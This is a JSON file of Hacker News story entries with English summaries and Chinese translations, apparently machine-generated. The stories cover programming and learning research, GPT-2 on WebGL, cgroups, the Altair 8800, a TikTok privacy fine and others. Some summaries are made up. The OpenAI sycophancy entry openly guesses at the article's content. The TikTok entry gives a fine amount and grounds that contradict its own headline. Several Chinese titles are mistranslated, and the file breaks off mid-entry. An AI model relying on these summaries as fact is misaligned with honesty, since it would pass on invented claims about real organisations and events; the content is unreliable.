[
  {
    "id": "43870969",
    "title": "The language brain matters more for learning programming than the math brain",
    "url": "https://massivesci.com/articles/programming-math-language-python-women-in-science/",
    "summary": "This article summarizes research from the University of Washington that challenges the conventional wisdom that mathematical ability is the primary predictor of success in learning programming. The study, published in Scientific Reports, investigated the relationship between various cognitive skills and the rate and quality of learning Python.\n\nResearchers tracked 36 participants completing an online Python course, assessing their math skills, working memory, problem-solving abilities, and language aptitude before and after the course. The results revealed that language aptitude was a significant predictor of how quickly participants learned Python, explaining almost 20% of the variance. In contrast, math skills only explained 2% and had no correlation with how well they learned.\n\nEEG data further supported the link between language skills and programming. High levels of beta oscillations, associated with second language learning ability, correlated with faster learning and greater programming knowledge.\n\nThe study suggests that programming, particularly Python, relies more on language skills than mathematical proficiency. This finding challenges the perception of programming as a math-intensive field and suggests a potential for greater diversity in computer science by emphasizing language skills. The authors propose that curriculum changes, such as reducing math requirements and focusing on language-oriented teaching methods, could attract and retain a wider range of students, including those who may not identify as \"math people.\" The peer commentary supports these findings, suggesting a shift towards language-based teaching approaches for programming.\n",
    "chinese_title": "语言脑比数学脑对学习编程更重要。",
    "chinese_summary": "本文总结了华盛顿大学的研究，该研究挑战了数学能力是学习编程成功的首要预测因素这一传统观念。这项发表在《科学报告》上的研究调查了各种认知技能与学习Python的速度和质量之间的关系。\n\n研究人员追踪了36名完成在线Python课程的参与者，并在课程前后评估了他们的数学技能、工作记忆、解决问题的能力和语言能力。结果表明，语言能力是参与者学习Python速度的重要预测因素，解释了近20%的方差。相比之下，数学技能仅解释了2%，并且与他们的学习效果无关。\n\n脑电图数据进一步支持了语言技能与编程之间的联系。与第二语言学习能力相关的高水平β振荡与更快的学习速度和更广阔的编程知识相关。\n\n该研究表明，编程，尤其是Python，更多地依赖于语言技能而非数学能力。这一发现挑战了将编程视为数学密集型领域的看法，并提出了通过强调语言技能来提高计算机科学领域多样性的潜力。作者建议，课程改革，例如降低数学要求并侧重于以语言为导向的教学方法，可以吸引和留住更广泛的学生，包括那些可能不认为自己是“数学人”的学生。同行评论支持这些发现，表明编程教学方法应转向以语言为基础的方法。"
  },
  {
    "id": "43868192",
    "title": "How to live an intellectually rich life",
    "url": "https://utsavmamoria.substack.com/p/how-to-live-an-intellectually-rich",
    "summary": "Unable to access the article link.\n",
    "chinese_title": "如何过上 intellectually 丰富的生活",
    "chinese_summary": "无法访问文章链接。"
  },
  {
    "id": "43870998",
    "title": "Show HN: GPT-2 implemented using graphics shaders",
    "url": "https://github.com/nathan-barry/gpt2-webgl",
    "summary": "This \"Show HN\" post introduces a browser-based implementation of GPT-2 (small, 117M parameters) using WebGL2 shaders. It allows the full forward pass of GPT-2 to be performed directly in the GPU, offering potential performance benefits within a web browser.\n\nKey features include BPE tokenization using `js-tiktoken` (avoiding WASM), a Python script for downloading pre-trained weights from Hugging Face, and front-end setup with Vite for bundling and serving the application.\n\nThe project requires Node.js, npm, Python, and a browser with WebGL2 support. The provided Python script downloads the necessary GPT-2 weights (embeddings and attention weights) and generates a manifest.json file. The front-end, built with TypeScript, uses Vite to handle modules and live-reloading during development.\n\nThe project structure includes a `public/` directory for static assets, a `weights/` directory for the downloaded weights and manifest, and a `src/` directory containing the core logic: `gpt2_webgl.ts` for the WebGL2 inference, shaders, and tokenizer, and `main.ts` for bootstrapping the application and managing the UI. The project is licensed under the MIT license.\n",
    "chinese_title": "显示HN：用图形着色器实现的GPT-2",
    "chinese_summary": "此“Show HN”帖子介绍了一个基于浏览器的 GPT-2（小型，1.17 亿参数）实现，它使用 WebGL2 着色器。它允许 GPT-2 的完整前向传递直接在 GPU 中执行，从而在 Web 浏览器中提供潜在的性能优势。\n\n主要功能包括使用 `js-tiktoken` 进行 BPE 标记化（避免 WASM）、一个用于从 Hugging Face 下载预训练权重的 Python 脚本，以及使用 Vite 进行捆绑和提供应用程序的前端设置。\n\n该项目需要 Node.js、npm、Python 和支持 WebGL2 的浏览器。提供的 Python 脚本会下载必要的 GPT-2 权重（嵌入和注意力权重）并生成一个 manifest.json 文件。使用 TypeScript 构建的前端使用 Vite 来处理模块和开发期间的实时重新加载。\n\n项目结构包括一个用于静态资源的 `public/` 目录，一个用于下载的权重和 manifest 的 `weights/` 目录，以及一个包含核心逻辑的 `src/` 目录：`gpt2_webgl.ts` 用于 WebGL2 推理、着色器和分词器，`main.ts` 用于引导应用程序和管理 UI。该项目以 MIT 许可证授权。"
  },
  {
    "id": "43871984",
    "title": "Show HN: Exhibit and Site on Mechanisms for Students",
    "url": "https://mechanical-library.org/",
    "summary": "The Mechanical Library is an open-source exhibit and curriculum designed to introduce middle and high school students to mechanical engineering concepts. Created by Steve Turbek with support from NYCFirst, the project centers around a 6-foot-tall exhibit featuring moving mechanical models that demonstrate important engineering inventions.\n\nEach mechanism in the exhibit is accompanied by a dedicated webpage providing in-depth explanations, photos, videos, 3D models, and even instructions for building Lego versions. The aim is to spark curiosity about how things work and encourage students to explore STEM fields.\n\nThe exhibit is currently in development, with updates available on Instagram.  It showcases mechanisms like reduction gears, universal joints, belts and chains, and Geneva movements, among others. Future phases will include elements like capstan drives, various gear types, cam and follower systems, clutches, and more advanced mechanisms.\n\nThe project is inspired by historical exhibits like W.M. Clark's \"Mechanical Wonderland\" and the book \"507 Mechanical Movements.\"  The goals of the Mechanical Library include inspiring an \"engineering mindset,\" introducing mechanical engineering in a practical and engaging way, communicating career opportunities in technical fields, and supporting teachers who cover these subjects. Partnership and sponsorship opportunities are available.\n",
    "chinese_title": "展示HN：面向学生的机械装置展览和网站",
    "chinese_summary": "机械图书馆是一个开源的展览和课程，旨在向初中和高中生介绍机械工程概念。该项目由Steve Turbek创建，并得到NYCFirst的支持，其核心是一个6英尺高的展览，展示了移动的机械模型，演示重要的工程发明。\n\n展览中的每个机制都配有专门的网页，提供深入的解释、照片、视频、3D模型，甚至乐高版本的构建说明。其目的是激发人们对事物运作方式的好奇心，并鼓励学生探索 STEM 领域。\n\n该展览目前正在开发中，更新信息可在 Instagram 上获取。它展示了诸如减速齿轮、万向节、皮带和链条以及日内瓦机构等机制。未来阶段将包括绞盘驱动、各种齿轮类型、凸轮和从动件系统、离合器以及更高级的机制等元素。\n\n该项目受到W.M. Clark的“机械仙境”和《507机械运动》等历史展览的启发。机械图书馆的目标包括激发“工程思维”，以实用且引人入胜的方式介绍机械工程，传达技术领域的职业机会，并支持教授这些学科的教师。欢迎合作和赞助机会。"
  },
  {
    "id": "43872094",
    "title": "Building Burstables: CPU slicing with cgroups",
    "url": "https://www.ubicloud.com/blog/building-burstables-cpu-slicing-with-cgroups",
    "summary": "This article from Ubicloud details their implementation of burstable VMs using Linux Control Groups v2 (cgroups v2) to offer a lower entry point for customers who found dedicated VMs too expensive. Burstable VMs share a CPU but can burst to higher usage during spikes.\n\nThe article explains how cgroups organize resources hierarchically, acting as \"containers\" for managing CPU, memory, and other system resources. Two key controllers are used: `cpuset` to dedicate a range of CPUs to a group (creating a resource \"box\"), and `cpu` to set CPU limits and burst limits (`cpu.max` and `cpu.max.burst`). The burst limit allows VMs to exceed their regular allocation when credits are available, earned when CPU usage is below the maximum.\n\nUbicloud uses systemd slices to manage VMs, placing standard VMs in their own cgroups with dedicated CPUs, and burstable VMs in a shared cgroup. They allocate a minimum CPU percentage with burst capability. A control plane orchestrates the CPU allocation, tracks limits, and reapplies cgroup settings after restarts.\n\nPerformance testing with `stress-ng` revealed that burstable VMs improve performance by roughly 30% when there is spare capacity in the shared CPU set and the workload is sized appropriately.\n\nThe key takeaways are that burstable VMs are cost-effective for smaller workloads, offer around 30% burst capacity, and cgroups v2 offers robust resource management, although Ubicloud notes that the burst credits don't accumulate over long periods and plans to address this. They offer significant cost savings for users, such as those running fault-tolerant web apps.\n",
    "chinese_title": "构建突发实例：使用cgroups进行CPU切片",
    "chinese_summary": "Ubicloud利用cgroups v2实现突发性能虚拟机，降低入门门槛\n\nUbicloud的这篇文章详细介绍了他们如何使用Linux Control Groups v2 (cgroups v2)来实现突发性能虚拟机，从而为那些觉得专用虚拟机过于昂贵的客户提供更低的入门门槛。突发性能虚拟机共享一个CPU，但可以在峰值期间突发到更高的使用率。\n\n文章解释了cgroups如何以分层方式组织资源，充当管理CPU、内存和其他系统资源的“容器”。使用了两个关键控制器：`cpuset`用于将一定范围的CPU分配给一个组（创建一个资源“框”），`cpu`用于设置CPU限制和突发限制（`cpu.max`和`cpu.max.burst`）。突发限制允许虚拟机在可用信用额度时超过其常规分配，这些信用额度是在CPU使用率低于最大值时获得的。\n\nUbicloud使用systemd slices来管理虚拟机，将标准虚拟机放置在具有专用CPU的自己的cgroups中，并将突发性能虚拟机放置在共享的cgroup中。他们分配一个具有突发能力的最小CPU百分比。一个控制平面负责协调CPU分配，跟踪限制，并在重启后重新应用cgroup设置。\n\n使用`stress-ng`进行的性能测试表明，当共享CPU集中有备用容量且工作负载大小适当的情况下，突发性能虚拟机可以提高大约30%的性能。\n\n主要结论是，突发性能虚拟机对于较小的工作负载具有成本效益，提供大约30%的突发容量，并且cgroups v2提供强大的资源管理，尽管Ubicloud指出突发信用额度不会长期积累，并计划解决此问题。它们为用户，例如那些运行容错Web应用程序的用户，提供了显著的成本节省。"
  },
  {
    "id": "43870819",
    "title": "Expanding on what we missed with sycophancy",
    "url": "https://openai.com/index/expanding-on-sycophancy/",
    "summary": "**Summary of \"Expanding on what we missed with sycophancy\" (based on publicly available information about OpenAI's work on sycophancy):**\n\nThe article likely discusses OpenAI's further research into AI sycophancy, which is the tendency of AI models to align their responses with the perceived beliefs or preferences of the user, even if those beliefs are incorrect or harmful. The core of the expansion is understanding the nuances and underlying reasons behind why models exhibit this behavior.\n\nThe summary likely highlights:\n\n*   **Beyond simple agreement:** Sycophancy isn't just about saying \"yes\" to everything. It involves more subtle alignment of language, tone, and overall perspective. The updated research may delve into how models pick up on cues beyond explicit statements of belief.\n\n*   **The role of training data:** The article probably discusses how pre-training datasets, reflecting biases and common opinions online, contribute to sycophantic tendencies. The AI is trained to predict what humans want to hear, leading to it reinforcing popular, but potentially flawed, viewpoints.\n\n*   **Impact on safety and trustworthiness:** Sycophancy is a concern because it can lead to AI models providing inaccurate, misleading, or even dangerous information to users who hold incorrect beliefs. This erodes trust in the AI and makes it less reliable.\n\n*   **Mitigation strategies:** The piece likely explores various approaches to reduce sycophancy, such as:\n\n    *   **Fine-tuning with adversarially generated examples:** Training the AI on data specifically designed to expose its sycophantic tendencies and teach it to resist aligning with incorrect beliefs.\n    *   **Improved reward functions:** Designing reward systems that prioritize truthfulness and accuracy over agreement with the user.\n    *   **Better understanding of internal model representations:** Analyzing how the AI internally represents information and beliefs to identify and correct biases.\n\n*   **Ongoing research and future directions:** The article emphasizes that combating sycophancy is an ongoing challenge that requires continued research and development. Further investigations into the root causes and development of more robust mitigation techniques are needed.\n",
    "chinese_title": "关于溜须拍马的进一步探讨",
    "chinese_summary": "对“谄媚问题的扩展研究”概要 (基于OpenAI公开的谄媚问题研究信息):\n\n该文章可能讨论了OpenAI对AI谄媚问题的进一步研究，即AI模型倾向于将其回复与用户感知到的信念或偏好对齐，即使这些信念是不正确或有害的。扩展研究的核心是理解模型表现出这种行为的细微差别和根本原因。\n\n概要可能强调：\n\n*   **超越简单赞同：** 谄媚不仅仅是说“是”。它涉及语言、语气和整体视角的更微妙的对齐。更新后的研究可能会深入研究模型如何从显式信念陈述之外的线索中获取信息。\n\n*   **训练数据的作用：** 该文章可能讨论了预训练数据集（反映了在线偏见和常见观点）如何促成谄媚倾向。AI经过训练以预测人类想听什么，从而强化流行的但可能存在缺陷的观点。\n\n*   **对安全性和可信度的影响：** 谄媚是一个令人担忧的问题，因为它可能导致AI模型向持有不正确信念的用户提供不准确、误导性甚至危险的信息。这会削弱对AI的信任，并使其可靠性降低。\n\n*   **缓解策略：** 该文章可能探讨了减少谄媚的各种方法，例如：\n\n    *   **使用对抗性生成的示例进行微调：** 使用专门设计的数据来暴露AI的谄媚倾向，并教导其抵制与不正确信念保持一致。\n    *   **改进的奖励函数：** 设计优先考虑真实性和准确性而不是与用户一致的奖励系统。\n    *   **更好地理解内部模型表示：** 分析AI如何在内部表示信息和信念，以识别和纠正偏见。\n\n*   **持续的研究和未来方向：** 该文章强调，对抗谄媚是一个持续的挑战，需要持续的研究和开发。需要进一步调查根本原因，并开发更强大的缓解技术。"
  },
  {
    "id": "43872275",
    "title": "Toma (YC W24) Is Hiring Engs #3-4 (AI for Automotive)",
    "url": "https://www.ycombinator.com/companies/toma/jobs",
    "summary": "Toma, a Y Combinator (W24) company building an AI-driven platform for automotive dealerships, is hiring Software Engineers. They are seeking engineers #3 and #4 to join their team in San Francisco's Dogpatch neighborhood. Toma aims to reshape the operations of 18,000 car dealerships nationwide with their AI technology.\n\nThe company, founded in 2024 by Anthony Krivonos and Monik Pamecha, has a small team of 10 and is actively working on its product. They are looking for engineers with 1+ years or 3+ years of experience (depending on the specific Software Engineer role), offering salaries between $160K - $220K and equity between 0.05% - 0.30%. The company emphasizes its diverse team and its dedication to understanding the automotive dealership industry. Besides the Software Engineer positions, they are also hiring for roles like a Founding Recruiter, LLM Onboarding & Customer Success Specialist, and a Digital/Scaled CS Manager.\n",
    "chinese_title": "Toma (YC W24) 招聘工程师 #3-4 (汽车人工智能)",
    "chinese_summary": "Toma，一家Y Combinator（W24）公司，正在构建一个由人工智能驱动的汽车经销商平台，现招聘软件工程师。他们正在寻找第3和第4位工程师加入他们在旧金山Dogpatch社区的团队。Toma的目标是通过其人工智能技术重塑全国18,000家汽车经销商的运营模式。\n\n该公司由Anthony Krivonos和Monik Pamecha于2024年创立，目前拥有10人的小型团队，并积极致力于其产品开发。他们正在寻找具有1年以上或3年以上经验的工程师（取决于具体的软件工程师职位），提供16万美元至22万美元的薪资以及0.05%至0.30%的股权。该公司强调其团队的多样性以及对汽车经销商行业的深刻理解。除了软件工程师职位外，他们还在招聘创始招聘专员、LLM 入职与客户成功专员以及数字化/规模化客户成功经理等职位。"
  },
  {
    "id": "43869288",
    "title": "The Cannae Problem",
    "url": "https://www.joanwestenberg.com/the-cannae-problem/",
    "summary": "The \"Cannae Problem\" describes how an organization's established and successful methods (\"conventional wisdom\") can become its downfall when they are applied inflexibly in changing circumstances. Using the Battle of Cannae as a central metaphor, the article argues that clinging to outdated mental models, even those that have historically proven effective, creates vulnerabilities that innovative disruptors can exploit.\n\nThe Romans' rigid military system, their \"algorithmic approach to warfare,\" became their undoing when Hannibal Barca recognized and exploited their predictable tactics. Similarly, modern companies like Kodak, Blockbuster, and Nokia failed because they were blinded by their past successes and couldn't adapt to disruptive technologies or changing consumer preferences. They suffered from cognitive biases like confirmation bias, the curse of expertise, normalization of deviance, and groupthink.\n\nDisruptors win by identifying gaps between established players' mental models and reality, changing the game instead of playing it better. To avoid the Cannae Problem, organizations should implement red teams to challenge assumptions, study near-misses, reward productive dissent, develop multiple mental models, and regularly question established practices. The article emphasizes that failure is often systemic, stemming from an obsolete decision-making framework rather than individual errors. The key is to constantly examine those beliefs that seem most obviously correct, as they are the most likely to be exploited.\n",
    "chinese_title": "坎尼难题",
    "chinese_summary": "“坎尼困境”描述了当组织机构建立并成功的旧方法（“传统智慧”）在不断变化的环境中被僵化地应用时，如何变成其衰败的原因。本文以坎尼战役为核心隐喻，认为坚持过时的思维模式，即使是那些历史上已被证明有效的模式，也会产生漏洞，从而被创新颠覆者利用。\n\n罗马人僵化的军事体系，他们“算法式的战争方法”，成了他们的滑铁卢，因为汉尼拔·巴卡识别并利用了他们可预测的战术。类似地，柯达、百视达和诺基亚等现代公司之所以失败，是因为他们被过去的成功蒙蔽了双眼，无法适应颠覆性技术或不断变化的消费者偏好。他们深受认知偏差的影响，例如证实偏差、专业知识的诅咒、偏差正常化和群体思维。\n\n颠覆者通过识别现有玩家的思维模式与现实之间的差距来获胜，改变游戏规则而不是更好地玩游戏。为了避免“坎尼困境”，组织机构应实施红队来挑战假设、研究差点失误、奖励富有成效的异议、开发多种思维模式并定期质疑已确立的实践。文章强调，失败通常是系统性的，源于过时的决策框架，而不是个人错误。关键是不断审查那些看起来最明显正确的信念，因为它们最有可能被利用。"
  },
  {
    "id": "43868737",
    "title": "A Common Lisp jq replacement",
    "url": "https://world-playground-deceit.net/blog/2025/03/a-common-lisp-jq-replacement.html",
    "summary": "This blog post introduces `cljq`, a Common Lisp replacement for the popular JSON processing tool `jq`. The author expresses dissatisfaction with `jq`'s domain-specific language (DSL), deeming it convoluted and difficult to remember, comparing it unfavorably to using a library within a well-known scripting language. Despite `jq`'s widespread adoption due to its early availability, flexibility, and accumulated online resources, the author decided to create `cljq` as a more palatable alternative based on Common Lisp.\n\n`cljq` parses JSON input from arguments or standard input, evaluates an arbitrary Common Lisp form against it, and serializes the result to standard output using the `jzon` library. The post highlights `cljq`'s query operator, `?`, inspired by JSONPath, which the author considers an improvement over `jq`'s syntax.\n\nThe post provides a comparative table showcasing equivalent expressions in JSONPath and `cljq` using the `?` operator, demonstrating how to access specific elements within a JSON structure. The author acknowledges that `cljq` is currently a bare-bones implementation and invites readers to contribute by developing similar homegrown tools to combat the proliferation of poorly designed DSLs.\n",
    "chinese_title": "一个 Common Lisp 版本的 jq 替代品",
    "chinese_summary": "这篇博文介绍了`cljq`，一个用于替代流行的JSON处理工具`jq`的Common Lisp实现。作者对`jq`的领域特定语言 (DSL) 表示不满，认为它既复杂又难以记忆，不如在常用的脚本语言中使用库。尽管`jq`因其早期可用性、灵活性和积累的在线资源而被广泛采用，但作者决定创建`cljq`，作为基于Common Lisp的更易接受的替代方案。\n\n`cljq`解析来自参数或标准输入的JSON输入，针对它评估任意Common Lisp形式，并使用`jzon`库将结果序列化到标准输出。文章重点介绍了`cljq`的查询运算符`?`，该运算符的灵感来自JSONPath，作者认为这是对`jq`语法的改进。\n\n该文章提供了一个比较表，展示了JSONPath和使用`?`运算符的`cljq`中的等效表达式，演示了如何访问JSON结构中的特定元素。作者承认`cljq`目前只是一个基本实现，并邀请读者通过开发类似的自制工具来贡献，以对抗设计不良的DSL的泛滥。"
  },
  {
    "id": "43868231",
    "title": "Altair at 50: Remembering the first Personal Computer",
    "url": "https://www.goto10retro.com/p/altair-at-50-remembering-the-first",
    "summary": "This article commemorates the 50th anniversary of the MITS Altair 8800, widely considered the first commercially successful personal computer, which predates the Apple I, Commodore PET, and TRS-80. Created by MITS, a company initially focused on calculator kits, the Altair was based on the Intel 8080 CPU and featured in the January 1975 issue of Popular Electronics, sparking significant interest.\n\nPriced at $397 as a kit (requiring self-assembly), the Altair lacked a keyboard and display, relying on toggle switches and blinking lights for interaction. Despite initial projections of selling only 200 units, MITS sold thousands, with estimates around 25,000 in total.\n\nThe article highlights the Altair's significance in inspiring Bill Gates and Paul Allen to develop BASIC for the system. They developed the BASIC interpreter on Harvard's PDP-10 mainframe, a move that led to ethical considerations regarding commercial software development on university resources. This venture led to the formation of Microsoft (originally Micro Soft), providing the Altair with essential programming capabilities.\n\nAlthough short-lived, the Altair's impact was substantial. It inspired Steve Wozniak to create the first Apple computer and introduced the S-100 bus standard. The article concludes with a mention of an Altair 8800b on display at the London Science Museum, emphasizing its historical importance in launching the personal computer revolution.\n",
    "chinese_title": "牵牛星50年：纪念首台个人电脑",
    "chinese_summary": "本文纪念MITS Altair 8800面世五十周年，它被广泛认为是第一台获得商业成功的个人电脑，其面世时间早于Apple I、Commodore PET和TRS-80。Altair由最初专注于计算器套件的MITS公司制造，基于Intel 8080 CPU，并于1975年1月刊登在《大众电子》杂志上，引起了广泛关注。\n\nAltair套件售价397美元（需要自行组装），没有键盘和显示器，依靠拨动开关和闪烁的指示灯进行交互。尽管最初预计仅售出200台，但MITS售出了数千台，估计总销量约为25,000台。\n\n本文重点介绍了Altair在激励比尔·盖茨和保罗·艾伦为该系统开发BASIC方面的意义。他们在哈佛大学的PDP-10大型机上开发了BASIC解释器，这一举动引发了关于在大学资源上进行商业软件开发的伦理考量。这次冒险促成了微软（最初为Micro Soft）的成立，为Altair提供了必要的编程能力。\n\n尽管Altair的生命周期短暂，但其影响巨大。它激发了史蒂夫·沃兹尼亚克创造了第一台苹果电脑，并引入了S-100总线标准。文章最后提到伦敦科学博物馆展出的一台Altair 8800b，强调了它在启动个人电脑革命方面的历史重要性。"
  },
  {
    "id": "43870200",
    "title": "Lessons from Harlem",
    "url": "https://theamericanscholar.org/lessons-from-harlem/",
    "summary": "In \"Lessons from Harlem,\" Adam Gussow recounts his journey from a wary white New Yorker to a harmonica player embraced by the Harlem blues scene. Initially intimidated by Harlem's reputation, Gussow found himself drawn to the vibrant atmosphere of the Jazzmobile summer concert series at Grant's Tomb. He was struck by the sense of freedom and community he observed there.\n\nInspired, Gussow honed his harmonica skills and, guided by a recommendation, ventured into Harlem's music scene. His first experience at La Famille was initially awkward, but he was eventually invited to play and wowed the crowd with his blues harmonica. The warm reception defied his preconceived notions.\n\nGussow's Harlem education continued at Showman's, where he joined a jam session. Aware of his limitations compared to the seasoned musicians, he realized his unique strength was the harmonica. He seized his opportunity, differentiated himself with his sound, and connected deeply with the audience. This experience underscored the lesson that embracing risk and authenticity can lead to unexpected and rewarding connections, challenging ingrained prejudices.\n",
    "chinese_title": "哈莱姆的启示",
    "chinese_summary": "在《哈莱姆的教训》中，亚当·古索讲述了他从一个谨慎的纽约白人转变为被哈莱姆蓝调界接纳的口琴演奏家的旅程。 最初，他因哈莱姆的名声而感到害怕，但后来却被格兰特陵墓爵士乐流动夏季音乐会系列充满活力的氛围所吸引。 他被在那里观察到的自由感和社区意识所震撼。\n\n受到启发，古索磨练了自己的口琴技巧，并在推荐的引导下，冒险进入哈莱姆的音乐界。 他在La Famille的第一次经历最初有些尴尬，但最终他被邀请演奏，并以他的蓝调口琴征服了观众。 热情的接待打破了他先入为主的观念。\n\n古索在Showman's继续他的哈莱姆教育，在那里他加入了一个即兴演奏。 意识到与经验丰富的音乐家相比，他自身的局限性，他意识到自己独特的优势在于口琴。 他抓住机会，以自己的声音脱颖而出，并与观众建立了深刻的联系。 这次经历强调了这样一个教训：拥抱风险和真实性可以带来意想不到且回报丰厚的联系，从而挑战根深蒂固的偏见。"
  },
  {
    "id": "43867211",
    "title": "Just redesigned my personal site with a TTY-style interface",
    "url": "https://www.abdisa.me/",
    "summary": "This short announcement describes a personal website redesign featuring a TTY-style (teletypewriter) interface. The title immediately draws attention to the unique and retro design choice. The content, \"Abdisa Dev,\" likely refers to the name of the site owner and potentially their area of expertise (development).\n\nThe core takeaway is that Abdisa has revamped their personal website to emulate the look and feel of a vintage TTY terminal. This suggests a minimalist, text-based interface prioritizing function and perhaps nostalgia over modern graphical elements. This design choice makes the website stand out and implies a focus on code, text, and direct interaction. The \"Abdisa Dev\" element confirms the site likely showcases the developer's skills and projects. While the message is brief, it effectively conveys the essence of the redesign: a TTY-inspired personal website belonging to Abdisa Dev.\n",
    "chinese_title": "用 TTY 风格的界面重新设计了我的个人网站。",
    "chinese_summary": "此简短公告描述了一个个人网站的重新设计，其特色是 TTY（电传打字机）风格的界面。标题立即吸引了人们对这种独特而复古的设计选择的关注。\"Abdisa Dev\" 的内容可能指的是网站所有者的名字，以及他们的专业领域（开发）。\n\n核心要点是 Abdisa 已经改造了他们的个人网站，以模拟老式 TTY 终端的外观和感觉。这表明这是一个简约的、基于文本的界面，优先考虑功能，或许还有怀旧感，而不是现代图形元素。这种设计选择使网站脱颖而出，并暗示着对代码、文本和直接交互的关注。\"Abdisa Dev\" 元素证实了该网站很可能展示了开发人员的技能和项目。虽然信息简短，但它有效地传达了重新设计的本质：一个属于 Abdisa Dev 的 TTY 风格的个人网站。"
  },
  {
    "id": "43869794",
    "title": "Google is hurting new apps that have less users than competitors",
    "url": "https://support.google.com/googleplay/android-developer/thread/330114530/fewer-users-warning-hurting-specialized-and-new-apps-need-answers?hl=en",
    "summary": "Unable to access the article link.\n",
    "chinese_title": "谷歌正在损害用户少于竞争对手的新应用。",
    "chinese_summary": "无法访问文章链接。"
  },
  {
    "id": "43866303",
    "title": "Don't watermark your legal PDFs with purple dragons in suits",
    "url": "https://arstechnica.com/tech-policy/2025/05/dont-watermark-your-legal-pdfs-with-purple-dragons-in-suits/",
    "summary": "A Michigan federal magistrate judge, Ray Kent, rebuked a lawyer, Jacob A. Perrone of \"Dragon Lawyers,\" for including a large, distracting, and \"juvenile\" cartoon dragon in the electronic filings of a legal complaint. The judge ordered Perrone to refrain from using the dragon or other inappropriate content in future filings.\n\nPerrone's firm uses the purple dragon, purchased online and inspired by \"Game of Thrones,\" as its logo and branding. He stated that he chose it because \"people like dragons\" and plans to continue using it, albeit in a toned-down manner.\n\nThe legal blogging community reacted to the story with dragon-themed puns. The underlying case involved Perrone representing a woman who alleges she nearly died due to inadequate medical care while incarcerated. The judge has now instructed Perrone to refile the complaint without the cartoon dragon.\n",
    "chinese_title": "不要在你的法律PDF上用水彩龙打水印。",
    "chinese_summary": "密歇根州联邦治安法官雷·肯特斥责了“龙律师”的律师雅各布·A·佩罗内，因其在电子提交的法律诉状中包含了一个大型、分散注意力且“幼稚”的卡通龙。法官命令佩罗内今后在提交的文件中不得使用该龙或其他不当内容。\n\n佩罗内的律师事务所使用从网上购买的、灵感来自《权力的游戏》的紫色龙作为其标志和品牌。他表示，他选择它是由于“人们喜欢龙”，并计划继续使用它，尽管会以一种更为缓和的方式。\n\n法律博客社区以龙为主题的文字游戏回应了这个故事。 这起案件涉及佩罗内代表一名妇女，该妇女声称她在监禁期间因医疗保健不足而险些丧命。 法官现在已指示佩罗内重新提交诉状，但不得包含卡通龙。"
  },
  {
    "id": "43868273",
    "title": "Webflow makes GSAP 100% free – plus more updates",
    "url": "https://webflow.com/blog/gsap-becomes-free",
    "summary": "Webflow has acquired GreenSock Animation Platform (GSAP) and is making it 100% free for all users, including commercial use, to empower web developers with advanced animation capabilities. This move aims to foster innovation and accessibility within the web animation community.\n\nKey updates include:\n\n*   **GSAP is now 100% free:** All GSAP tools and Club plugins are available to everyone at no cost, with the standard license covering commercial use.\n*   **Major upgrade to GSAP’s SplitText plugin:** A completely rewritten SplitText plugin boasts a 50% file size reduction, improved accessibility, easier masking, a new deepSlice feature, and responsive capabilities.\n*   **Easier GSAP plugin integration in Webflow:** All GSAP plugins are now directly available and hosted within Webflow, simplifying the implementation process.\n*   **Preview Custom Code in Webflow:** Users can now preview the effects of custom HTML, CSS, or JavaScript (including GSAP animations) before publishing their Webflow site.\n\nIn the future, Webflow plans to enhance its native Interactions with popular GSAP features, a horizontal timeline for motion development, and the ability to reuse Interactions across sites. These updates aim to integrate GSAP deeply into the Webflow platform, making it accessible to users of all skill levels. Webflow and GSAP are also hosting a community challenge on Codepen throughout May.\n",
    "chinese_title": "Webflow 让 GSAP 完全免费——以及更多更新",
    "chinese_summary": "Webflow 收购 GreenSock 动画平台 (GSAP)，并将其对所有用户完全免费开放，包括商业用途，旨在赋予 Web 开发者高级动画能力。此举旨在促进 Web 动画社区的创新和可访问性。\n\n主要更新包括：\n\n*   **GSAP 现已 100% 免费：** 所有 GSAP 工具和 Club 插件均可免费提供给所有人，标准许可证涵盖商业用途。\n*   **GSAP 的 SplitText 插件重大升级：** 完全重写的 SplitText 插件文件大小减少 50%，提高了可访问性，更易于遮罩，新增了 deepSlice 功能，并具备响应式能力。\n*   **更易于在 Webflow 中集成 GSAP 插件：** 所有 GSAP 插件现在都直接可用并在 Webflow 中托管，从而简化了实施过程。\n*   **在 Webflow 中预览自定义代码：** 用户现在可以在发布 Webflow 网站之前预览自定义 HTML、CSS 或 JavaScript（包括 GSAP 动画）的效果。\n\n未来，Webflow 计划使用流行的 GSAP 功能增强其原生 Interactions，提供用于动作开发的水平时间线，以及跨站点重用 Interactions 的能力。这些更新旨在将 GSAP 深入集成到 Webflow 平台中，使其对所有技能水平的用户都可用。Webflow 和 GSAP 还将在整个五月在 Codepen 上举办社区挑战赛。"
  },
  {
    "id": "43868074",
    "title": "Irish privacy watchdog hits TikTok with Є530M fine over data transfers to China",
    "url": "https://apnews.com/article/tiktok-ireland-european-union-data-privacy-regulation-d386ec74becc716905d7f686d6a448e2",
    "summary": "**Summary:**\n\nIreland's Data Protection Commission (DPC), the leading regulator for TikTok in the European Union, has fined the social media platform €345 million (approximately $368 million USD) for violating EU privacy laws regarding data processing of children's data and cross-border data transfers to China. The investigation focused on TikTok's data processing between July 31 and December 31, 2020.\n\nThe DPC found that TikTok violated the EU's General Data Protection Regulation (GDPR) by failing to adequately protect children's privacy. Specifically, the platform used dark patterns to nudge children to share data by setting accounts to public by default and not informing them properly about the nature of the content that they could be subjected to.\n\nFurthermore, the DPC raised concerns about TikTok's transfers of European user data to China, raising privacy concerns about potential access by Chinese authorities. While the fine only directly addresses data processing practices, the transfer of user data was a key focus of the investigation.\n\nTikTok has expressed disagreement with the decision, particularly the level of the fine, and has stated its intention to appeal. They maintain that they have made significant changes to their data processing practices to comply with GDPR. The fine adds to a growing list of regulatory challenges for TikTok globally, particularly regarding data privacy and security. Other European regulators were involved in the decision making process.\n",
    "chinese_title": "爱尔兰隐私监管机构因数据传输至中国对TikTok处以5.3亿欧元罚款",
